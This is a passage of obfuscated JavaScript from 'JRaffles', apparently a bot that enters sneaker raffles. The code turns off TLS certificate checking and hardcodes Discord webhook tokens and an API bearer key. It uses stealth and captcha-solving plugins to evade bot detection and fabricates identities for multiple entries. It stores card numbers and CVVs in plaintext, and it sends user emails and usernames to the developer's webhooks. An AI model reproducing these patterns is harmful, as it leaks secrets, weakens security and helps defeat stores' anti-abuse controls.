process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x1ed524 = require('fs'), _0x2ed5e1 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x5dcf39(_0x19881c) {
    const _0x29e804 = _0x1ed524['createWriteStream'](_0x19881c, { 'flags': 'a' }), _0xf919c6 = console['log'];
    console['log'] = function () {
        const _0x233e02 = Array['prototype']['slice']['call'](arguments), _0x69a60 = _0x233e02['join']('\x20') + '\x0a';
        _0x29e804['write'](_0x69a60), _0xf919c6['apply'](console, _0x233e02);
    };
}
_0x5dcf39('../logs/log\x20' + _0x2ed5e1);
var _0x4a24f3 = require('tough-cookie'), _0x518654 = require('node-imap'), _0x78cd12 = require('util')['inspect'];
const _0x504fd9 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x1ed853 } = require('discord.js');
var _0x2bc5d9 = require('exe');
const { execFile: _0x2044eb } = require('child_process'), _0x45f1d0 = require('puppeteer-extra'), _0x5ae7c2 = require('puppeteer-extra-plugin-recaptcha'), _0x49d897 = require('puppeteer-extra-plugin-stealth'), _0x561058 = require('chalk'), _0x73a448 = require('node-bash-title'), _0x4a5c70 = require('axios'), _0x2057e4 = require('papaparse');
var _0x12b908 = require('random-name');
const _0x44d2d2 = require('request');
var _0x7c4c0f = require('prompt');
const _0x57be51 = _0x44d2d2['jar']();
var _0x263298 = {};
const _0x291dba = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x57b777 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2600d2 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x827400 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0xee3942 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x39218b = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x28526e = 'https://discord.com/api/webhooks/', _0x9c3347 = '' + _0x28526e + _0x2600d2, _0x515b29 = '' + _0x28526e + _0x827400, _0x48f5f5 = '' + _0x28526e + _0x291dba, _0x569bf6 = '' + _0x28526e + _0x57b777, _0x2f03c2 = '' + _0x28526e + _0xee3942, _0x13add5 = '' + _0x28526e + _0x39218b;
const _0x3b5c06 = JSON['parse'](_0x1ed524['readFileSync']('../package.json', 'utf-8')), _0x5ab5b1 = _0x3b5c06['version'];
var _0x45373f, _0x362291, _0x33fa51, _0x60e00a, _0x3ab8a5, _0x2c3793, _0x100f6f, _0x45b917;
const _0x4290af = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xaa0235 = ![];
const _0x113b61 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4c914b = '0123456789';
var _0xf44cf0 = _0x113b61['split']('');
const _0x29f3bf = require('auto-git-update'), _0x4713a1 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3a30b1 = new _0x29f3bf(_0x4713a1);
async function _0x285121() {
    _0x3ab8a5 = _0x1ed524['readdirSync']('../proxies'), _0x60e00a = _0x1ed524['readdirSync']('../tasks'), !_0x1ed524['existsSync']('../accounts/fenom.csv') && _0x1ed524['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x1ed524['existsSync']('../accounts/paypal.csv') && _0x1ed524['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x1ed524['existsSync']('../accounts/bstn.csv') && _0x1ed524['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x1ed524['existsSync']('../accounts/eql.csv') && _0x1ed524['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x1ed524['existsSync']('../failed-tasks.csv') && _0x1ed524['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x1ed524['existsSync']('../successful-tasks.csv') && _0x1ed524['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x263298 = JSON['parse'](_0x1ed524['readFileSync']('../settings.json', 'utf-8')), !_0x263298['delay'] && (_0x263298['delay'] = 0x3c, _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['masterMail'] && (_0x263298['masterMail'] = 'yourmail@gmail.com', _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['masterPassword'] && (_0x263298['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['captchaKey'] && (_0x263298['captchaKey'] = '', _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['useRandomProxy'] && (_0x263298['useRandomProxy'] = !![], _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['shuffleTasks'] && (_0x263298['shuffleTasks'] = ![], _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), !_0x263298['webhook'] && (_0x263298['webhook'] = '', _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), _0x263298['delay'] <= 0x1388 && (_0x263298['delay'] = _0x263298['delay'] * 0x3e8), _0x263298['AfewDelay'] && (delete _0x263298['AfewDelay'], _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), _0x263298['MahaDelay'] && (delete _0x263298['MahaDelay'], _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), _0x263298['footshopDelay'] && (delete _0x263298['footshopDelay'], _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298, null, 0x2))), _0x263298['MahaDelay'] = _0x263298['delay'], _0x28526e = _0x263298['webhook'], _0x2c3793 = _0x263298['licenseKey'];
}
let _0x17ba0f, _0x2bb746 = [], _0x5d9319;
const _0x9175f4 = _0xf646b7 => new Promise(_0x116c46 => setTimeout(_0x116c46, _0xf646b7));
function _0x25f588(_0x12b197, _0x43f683) {
    return Math['floor'](Math['random']() * (_0x43f683 - _0x12b197 + 0x1) + _0x12b197);
}
function _0x46aee0(_0x4c4a46) {
    let _0x540c54 = _0x4c4a46['length'], _0x5ddeaf;
    while (_0x540c54 != 0x0) {
        _0x5ddeaf = Math['floor'](Math['random']() * _0x540c54), _0x540c54--, [_0x4c4a46[_0x540c54], _0x4c4a46[_0x5ddeaf]] = [
            _0x4c4a46[_0x5ddeaf],
            _0x4c4a46[_0x540c54]
        ];
    }
    return _0x4c4a46;
}
async function _0x361f34(_0x7ef035) {
    return _0x4a5c70['get']('https://api.hyper.co/v4/licenses/' + _0x7ef035, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4290af } })['then'](_0x2c5d54 => _0x2c5d54['data'])['catch'](() => null);
}
;
async function _0x4a339e(_0x4811ee) {
    console['clear']();
    if (_0x4811ee == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2a1584 = await _0x7c4c0f['get']('License');
        if (_0x2a1584['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x9175f4(0xbb8), _0x4a339e(_0x4811ee);
        _0x4811ee = _0x2a1584['License'], _0x263298['licenseKey'] = _0x4811ee, _0x2c3793 = _0x4811ee, _0x1ed524['writeFileSync']('../settings.json', JSON['stringify'](_0x263298));
    }
    console['log']('Checking\x20license\x20' + _0x2c3793 + '...'), await _0x9175f4(0x320);
    const _0x137892 = await _0x361f34(_0x4811ee);
    _0x100f6f = JSON['stringify'](_0x137892['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x45b917 = JSON['stringify'](_0x137892['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x137892)
        return console['log']('License\x20not\x20found');
    if (!_0x137892['user'])
        return console['log']('License\x20not\x20bound');
    return _0x137892['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xaa0235 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xaa0235 = ![]);
}
async function _0x58d31a() {
    var _0x3bb567 = await _0x7c4c0f['get']('Module');
    return console['clear'](), _0x3bb567['Module'];
}
;
async function _0x77d245() {
    var _0x3aaa7f = await _0x7c4c0f['get']('Setting');
    return console['clear'](), _0x3aaa7f['Setting'];
}
async function _0x13f2f2(_0x77ba6c) {
    var _0x33dec2 = [];
    for (file of _0x60e00a) {
        var _0x1276e2 = _0x1ed524['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x2057e4['parse'](_0x1276e2, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x77ba6c['store'] && _0x33dec2['push'](file);
    }
    !_0x33dec2['length'] == 0x0 && (_0x60e00a = _0x33dec2);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2b47f3 = 0x0; _0x2b47f3 < _0x60e00a['length']; _0x2b47f3++) {
        console['log']('\x20(' + _0x2b47f3 + ')\x20' + _0x60e00a[_0x2b47f3]);
    }
    console['log']('');
    var _0x3bf2c8 = await _0x7c4c0f['get']('Task');
    if (_0x3bf2c8['Task'] > _0x60e00a['length'] - 0x1 || isNaN(_0x3bf2c8['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x9175f4(0x3e8), _0x13f2f2();
    var _0x5aa49d = _0x1ed524['readFileSync']('../tasks/' + _0x60e00a[_0x3bf2c8['Task']], 'utf-8');
    return _0x33fa51 = _0x2057e4['parse'](_0x5aa49d, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x561058['blue'](_0x60e00a[_0x3bf2c8['Task']])), _0x45373f = _0x60e00a[_0x3bf2c8['Task']], _0x33fa51;
}
async function _0x4dde3f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x23e37d = 0x0; _0x23e37d < _0x3ab8a5['length']; _0x23e37d++) {
        console['log']('\x20(' + _0x23e37d + ')\x20' + _0x3ab8a5[_0x23e37d]);
    }
    console['log']('');
    var _0x627b81 = await _0x7c4c0f['get']('Proxies');
    if (_0x627b81['Proxies'] > _0x3ab8a5['length'] - 0x1 || isNaN(_0x627b81['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x9175f4(0x3e8), _0x4dde3f();
    var _0x10cba7 = _0x1ed524['readFileSync']('../proxies/' + _0x3ab8a5[_0x627b81['Proxies']], 'utf-8')['split']('\x0a');
    let _0x51a06d = _0x10cba7['map']((_0x3c9708, _0x480be5) => {
        sanatizeProxy = _0x3c9708['replace']('\x0d', '');
        if (_0x10cba7[_0x480be5 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x362291 = _0x3ab8a5[_0x627b81['Proxies']], console['clear'](), _0x51a06d;
}
async function _0x4429a3() {
    var _0x31edef = await _0x7c4c0f['get']('Value');
    return console['clear'](), _0x31edef['Value'];
}
async function _0x37ee1c(_0x5e7486) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x3f550d = 0x0; _0x3f550d < _0x5e7486['length']; _0x3f550d++) {
        console['log']('\x20(' + _0x3f550d + ')\x20[' + _0x5e7486[_0x3f550d]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3bb569 = await _0x7c4c0f['get']('Module');
    return _0x3bb569['Module'];
}
async function _0x1fdc4c() {
    var _0x1cdaa3 = await _0x7c4c0f['get']('Password');
    return console['clear'](), _0x1cdaa3['Password'];
}
;
async function _0x33e15a() {
    var _0x1c1c5b = await _0x7c4c0f['get']('Links');
    return _0x1c1c5b['Links'];
}
;
async function _0x6b8f3() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x4b77e0 = 0x0; _0x4b77e0 < _0x2bb746['length']; _0x4b77e0++) {
        console['log']('\x20(' + _0x4b77e0 + ')\x20' + _0x2bb746[_0x4b77e0]);
    }
    ;
    console['log']();
    let _0x1f2a56 = await _0x7c4c0f['get']('Product');
    return console['clear'](), _0x1f2a56['Product'];
}
;
function _0x1500d7() {
    var _0x440108 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x440108;
}
;
function _0xe5ae34() {
    var _0x1826a4 = new Date(Date['now']())['toLocaleString']();
    return _0x1826a4['replace'](',', '');
}
async function _0x1cac9f(_0x15555c, _0x28ea85) {
    let _0x239fbe = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5ab5b1 != 'devkey') {
        await _0x4a5c70['post'](_0x15555c, _0x28ea85, _0x239fbe);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x22ebf6(_0xfa1758, _0x5b7283, _0x48e17b, _0x54063e, _0x25c6ce) {
    if (!_0x54063e && _0x48e17b == 'dev') {
        var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x5b7283['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x5b7283['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0xfa1758['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x263298['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x100f6f,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0xfa1758['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0xfa1758['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5ab5b1,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1e24fc['data'];
    } else {
        if (_0x54063e && _0x48e17b == 'dev') {
            var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x100f6f,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x5b7283['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0xfa1758['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x263298['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x25c6ce,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0xfa1758['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0xfa1758['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5ab5b1,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1e24fc['data'];
        } else {
            if (_0x48e17b == 'pub') {
                var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x5b7283['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0xfa1758['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x263298['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0xfa1758['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5ab5b1,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1e24fc['data'];
            } else {
                if (_0x48e17b == 'acc' && !_0x54063e) {
                    var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x100f6f,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x5b7283['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x263298['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5ab5b1,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1e24fc['data'];
                } else {
                    if (_0x48e17b == 'acc' && _0x54063e) {
                        var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x100f6f,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x25c6ce,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x5b7283['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x263298['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5ab5b1,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1e24fc['data'];
                    } else {
                        if (_0x48e17b == 'open') {
                            var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x45b917)['addFields']({
                                'name': 'User',
                                'value': '' + _0x100f6f,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5ab5b1,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1e24fc['data'];
                        } else {
                            if (!_0x54063e && _0x48e17b == 'ver') {
                                var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x100f6f,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x5b7283['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x263298['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5ab5b1,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1e24fc['data'];
                            } else {
                                if (_0x54063e && _0x48e17b == 'ver') {
                                    var _0x1e24fc = new _0x1ed853()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x5b7283['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x100f6f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x25c6ce,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x5b7283['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x263298['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5ab5b1,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1e24fc['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5c0aeb(_0x47713c, _0x3ddda7) {
    var _0x312c44 = _0x47713c[_0x3ddda7]['Address1']['split'](''), _0x423b23 = _0x47713c[_0x3ddda7]['Address2']['split'](''), _0x2b712d = _0x47713c[_0x3ddda7]['Email']['split']('@');
    for (var _0x3e7635 = 0x0; _0x3e7635 < _0x312c44['length']; _0x3e7635++) {
        if (_0x312c44[_0x3e7635] == 'X') {
            var _0x2a6588 = Math['round'](Math['random']() * (_0x113b61['length'] - 0x1));
            _0x312c44[_0x3e7635] = _0xf44cf0[_0x2a6588];
        }
    }
    ;
    for (var _0x3e7635 = 0x0; _0x3e7635 < _0x423b23['length']; _0x3e7635++) {
        if (_0x423b23[_0x3e7635] == 'X') {
            var _0x2a6588 = Math['round'](Math['random']() * (_0x113b61['length'] - 0x1));
            _0x423b23[_0x3e7635] = _0xf44cf0[_0x2a6588];
        }
    }
    ;
    _0x47713c[_0x3ddda7]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x47713c[_0x3ddda7]['FirstName'] = _0x12b908['first']());
    _0x47713c[_0x3ddda7]['LastName']['toUpperCase']() == 'RANDOM' && (_0x47713c[_0x3ddda7]['LastName'] = _0x12b908['last']());
    _0x2b712d[0x0]['toUpperCase']() == 'RANDOM' ? _0x2b712d[0x0] = '' + _0x12b908['first']() + _0x12b908['last']() + _0x25f588(0x1, 0x270f) + '@' : _0x2b712d[0x0] = _0x2b712d[0x0] + '@';
    _0x47713c[_0x3ddda7]['Email'] = _0x2b712d['join'](''), _0x47713c[_0x3ddda7]['Address1'] = _0x312c44['join'](''), _0x47713c[_0x3ddda7]['Address2'] = _0x423b23['join']('');
    _0x47713c[_0x3ddda7]['Phone'] == 'RANDOM' && (_0x47713c[_0x3ddda7]['Phone'] = '0' + _0x25f588(0x5f5e100, 0x3b9ac9ff));
    if (_0x47713c[_0x3ddda7]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x37148f = _0x25f588(0x1, 0x270f);
        _0x47713c[_0x3ddda7]['Follower'] = '' + _0x12b908['first']() + _0x12b908['last']() + _0x37148f + '\x20';
    }
    _0x47713c[_0x3ddda7]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x47713c[_0x3ddda7]['HouseNumber'] = _0x25f588(0x1, 0xc8));
    if (_0x47713c[_0x3ddda7]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x163501 = Math['round'](Math['random']() * (_0x113b61['length'] - 0x1)), _0x29eb07 = _0xf44cf0[_0x163501];
        _0x47713c[_0x3ddda7]['Address1'] = _0x12b908['last']() + 'straat', _0x47713c[_0x3ddda7]['Zip'] == '' && (_0x47713c[_0x3ddda7]['Postcode'] = _0x25f588(0x3e8, 0x270f) + '\x20' + _0x29eb07 + _0x29eb07, _0x47713c[_0x3ddda7]['Zip'] = _0x47713c[_0x3ddda7]['Postcode']), _0x47713c[_0x3ddda7]['HouseNumber'] = '' + _0x25f588(0x1, 0xc8);
    }
    return;
}
;
async function _0x194f3c(_0x5dc8dc, _0x3b49e3) {
    _0x1ed524['appendFileSync']('../failed-tasks.csv', _0xe5ae34() + ',' + _0x3b49e3['store'] + ',' + _0x3b49e3['name'] + ',' + _0x5dc8dc['Url'] + ',' + _0x5dc8dc['Size'] + ',' + _0x5dc8dc['Follower'] + ',' + _0x5dc8dc['FirstName'] + ',' + _0x5dc8dc['LastName'] + ',' + _0x5dc8dc['Address1'] + ',' + _0x5dc8dc['Address2'] + ',' + _0x5dc8dc['HouseNumber'] + ',' + _0x5dc8dc['Zip'] + ',' + _0x5dc8dc['City'] + ',' + _0x5dc8dc['State'] + ',' + _0x5dc8dc['Country'] + ',' + _0x5dc8dc['Phone'] + ',' + _0x5dc8dc['Email'] + ',' + _0x5dc8dc['Password'] + ',' + _0x5dc8dc['PaymentMethod'] + ',' + _0x5dc8dc['CardType'] + ',' + _0x5dc8dc['NameOnCard'] + ',' + _0x5dc8dc['CardNumber'] + ',' + _0x5dc8dc['ExpiryDate'] + ',' + _0x5dc8dc['CVV'] + ',' + _0x5dc8dc['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x3e2f6d(_0x2db67e, _0x229a89) {
    _0x1ed524['appendFileSync']('../successful-tasks.csv', _0xe5ae34() + ',' + _0x229a89['store'] + ',' + _0x229a89['name'] + ',' + _0x2db67e['Url'] + ',' + _0x2db67e['Size'] + ',' + _0x2db67e['Follower'] + ',' + _0x2db67e['FirstName'] + ',' + _0x2db67e['LastName'] + ',' + _0x2db67e['Address1'] + ',' + _0x2db67e['Address2'] + ',' + _0x2db67e['HouseNumber'] + ',' + _0x2db67e['Zip'] + ',' + _0x2db67e['City'] + ',' + _0x2db67e['State'] + ',' + _0x2db67e['Country'] + ',' + _0x2db67e['Phone'] + ',' + _0x2db67e['Email'] + ',' + _0x2db67e['Password'] + ',' + _0x2db67e['PaymentMethod'] + ',' + _0x2db67e['CardType'] + ',' + _0x2db67e['NameOnCard'] + ',' + _0x2db67e['CardNumber'] + ',' + _0x2db67e['ExpiryDate'] + ',' + _0x2db67e['CVV'] + ',' + _0x2db67e['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x32da88() {
    let _0x19725a = proxyFile['split']('\x0a'), _0x2ca509 = _0x19725a['map']((_0x1db8f4, _0x372183) => {
        sanatizeProxy = _0x1db8f4['replace']('\x0d', '');
        if (_0x19725a[_0x372183 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2ca509;
}
;
async function _0x4f7ebf(_0x5eed02, _0x555ed0) {
    if (_0x20c26a != 'yes')
        var _0x20c26a = '', _0x4ca0dc = 0x0;
    async function _0x3545ff() {
        var _0x2e5a2f = _0x1ed524['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x35405d = _0x2057e4['parse'](_0x2e5a2f, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x342c11 = 0x0; _0x342c11 < _0x35405d['length']; _0x342c11++) {
            console['log']('(' + _0x342c11 + ')\x20' + _0x35405d[_0x342c11]['Email']);
        }
        console['log']('\x0a(' + _0x35405d['length'] + ')\x20' + _0x561058['cyan']('Add\x20a\x20new\x20account'));
        let _0xc65c73 = await _0x7c4c0f['get']('Option');
        if (_0xc65c73['Option'] < _0x35405d['length'])
            return _0x35405d[_0xc65c73['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x5f59e5 = {}, _0x2ae125 = await _0x7c4c0f['get']('Email');
        _0x5f59e5['Email'] = _0x2ae125['Email'];
        var _0x5f3bc5 = Math['round'](Math['random']() * (_0x555ed0['length'] - 0x1));
        _0x5f59e5['Proxy'] = _0x555ed0[_0x5f3bc5], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
